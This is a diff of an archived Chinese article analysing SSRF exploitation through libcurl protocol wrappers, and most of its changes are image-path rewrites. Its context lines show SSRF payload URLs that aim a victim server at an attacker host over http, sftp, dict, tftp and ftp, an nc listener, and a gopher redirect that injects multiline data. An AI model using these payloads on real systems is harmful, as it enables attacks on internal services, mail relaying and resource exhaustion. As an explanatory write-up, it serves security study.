@@ -3,7 +3,7 @@
 			<head>
 			     <title>SSRF libcurl protocol wrappers利用分析 - 小饼仔</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/13948">http://drops.wooyun.org/papers/13948</a></h1>
 				
@@ -59,13 +59,13 @@
 
 <p><code>http://victim:8084/ssrf.php?url=http://download.easyicon.net/png/1199986/96/</code></p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/75B3CE55-D9FA-4F05-9B81-AE3385E9676A.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808183819379.jpg" alt="" title="75B3CE55-D9FA-4F05-9B81-AE3385E9676A" class="alignnone size-full wp-image-13957"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/75B3CE55-D9FA-4F05-9B81-AE3385E9676A.jpg"><img src="../images_result/images/2016031808183819379.jpg" alt="" title="75B3CE55-D9FA-4F05-9B81-AE3385E9676A" class="alignnone size-full wp-image-13957"></a></p>
 
 <p>测试SSRF，在另一台机器上执行<code>nc -l -v 11111</code>，监听11111端口</p>
 
 <p>访问 <code>http://victim:8084/ssrf.php?url=http://attacker:11111/</code></p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/D2479565-6067-49CF-B12B-E4EF2D77BCA3.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808183850391.jpg" alt="" title="D2479565-6067-49CF-B12B-E4EF2D77BCA3" class="alignnone size-full wp-image-13956"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/D2479565-6067-49CF-B12B-E4EF2D77BCA3.jpg"><img src="../images_result/images/2016031808183850391.jpg" alt="" title="D2479565-6067-49CF-B12B-E4EF2D77BCA3" class="alignnone size-full wp-image-13956"></a></p>
 
 <h2>0x02 可利用的协议</h2>
 
@@ -113,9 +113,9 @@ Features: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz TLS-S
 
 <p>sftp(需要curl编译安装libssh库)访问:<code>http://victim:8084/ssrf.php?url=sftp://attacker:11111/</code></p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/F90A5E0B-F339-40F7-A8DC-140FBCF3505C.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808183951780.jpg" alt="" title="F90A5E0B-F339-40F7-A8DC-140FBCF3505C" class="alignnone size-full wp-image-13954"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/F90A5E0B-F339-40F7-A8DC-140FBCF3505C.jpg"><img src="../images_result/images/2016031808183951780.jpg" alt="" title="F90A5E0B-F339-40F7-A8DC-140FBCF3505C" class="alignnone size-full wp-image-13954"></a></p>
 
-<p>DICT访问 <code>http://victim:8084/ssrf.php?url=dict://attacker:11111/</code> <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/F83A4EAE-C755-46AF-8BAC-6384B740859A.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808183981394.jpg" alt="" title="F83A4EAE-C755-46AF-8BAC-6384B740859A" class="alignnone size-full wp-image-13953"></a></p>
+<p>DICT访问 <code>http://victim:8084/ssrf.php?url=dict://attacker:11111/</code> <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/F83A4EAE-C755-46AF-8BAC-6384B740859A.jpg"><img src="../images_result/images/2016031808183981394.jpg" alt="" title="F83A4EAE-C755-46AF-8BAC-6384B740859A" class="alignnone size-full wp-image-13953"></a></p>
 
 <p>可以看到服务使用的软件版本，<code>libssh2 1.4.3</code> 和 <code>libcurl 7.35.0</code>。查看下CVE</p>
 
@@ -144,7 +144,7 @@ header('Location: gopher://attacker:11111/_HI%0AMultiline%0Atest');
 
 <p>attacker端：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/9BF07BD2-D848-4609-9C57-0D08087BA647.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808183953884.jpg" alt="" title="9BF07BD2-D848-4609-9C57-0D08087BA647" class="alignnone size-full wp-image-13952"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/9BF07BD2-D848-4609-9C57-0D08087BA647.jpg"><img src="../images_result/images/2016031808183953884.jpg" alt="" title="9BF07BD2-D848-4609-9C57-0D08087BA647" class="alignnone size-full wp-image-13952"></a></p>
 
 <p>接下来是发送邮件，本来想用国内的邮箱试试的，然而都加了登陆验证来防止垃圾邮件。</p>
 
@@ -192,7 +192,7 @@ Test mail
 
 <p>日志</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/4303DD91-97BC-41C2-8037-D9C3CB6384D5.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808184049375.jpg" alt="" title="4303DD91-97BC-41C2-8037-D9C3CB6384D5" class="alignnone size-full wp-image-13951"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2016/03/4303DD91-97BC-41C2-8037-D9C3CB6384D5.jpg"><img src="../images_result/images/2016031808184049375.jpg" alt="" title="4303DD91-97BC-41C2-8037-D9C3CB6384D5" class="alignnone size-full wp-image-13951"></a></p>
 
 <hr>
 
@@ -202,7 +202,7 @@ Test mail
 
 <p>访问<code>http://Victim:8084/ssrf.php?url=tftp://Attacker:11111/TEST</code></p>
 
-<p>Attacker: <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/5E2AC53D-B859-41A3-8093-2ADD2674EB0A.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808184044868.jpg" alt="" title="5E2AC53D-B859-41A3-8093-2ADD2674EB0A" class="alignnone size-full wp-image-13950"></a></p>
+<p>Attacker: <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/5E2AC53D-B859-41A3-8093-2ADD2674EB0A.jpg"><img src="../images_result/images/2016031808184044868.jpg" alt="" title="5E2AC53D-B859-41A3-8093-2ADD2674EB0A" class="alignnone size-full wp-image-13950"></a></p>
 
 <p>可以用来向UDP服务发起请求，比如Memcache 和 REDIS-UDP</p>
 
@@ -216,7 +216,7 @@ Test mail
 
 <p>访问 <code>http://Victim:8084/ssrf.php?url=ftp://Attacker:11111/TEST</code></p>
 
-<p>nginx环境下默认超时时间为1分钟 <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C.jpg"><img src="http://static.wooyun.org//drops/20160318/2016031808184110257.jpg" alt="" title="C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C" class="alignnone size-full wp-image-13949"></a></p>
+<p>nginx环境下默认超时时间为1分钟 <a href="http://drops.wooyun.org/wp-content/uploads/2016/03/C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C.jpg"><img src="../images_result/images/2016031808184110257.jpg" alt="" title="C5A25D8D-1599-4E8B-83DB-EBCC7FB2051C" class="alignnone size-full wp-image-13949"></a></p>
 
 <p>攻击者可以发起大量请求来耗尽服务器的资源</p>
 
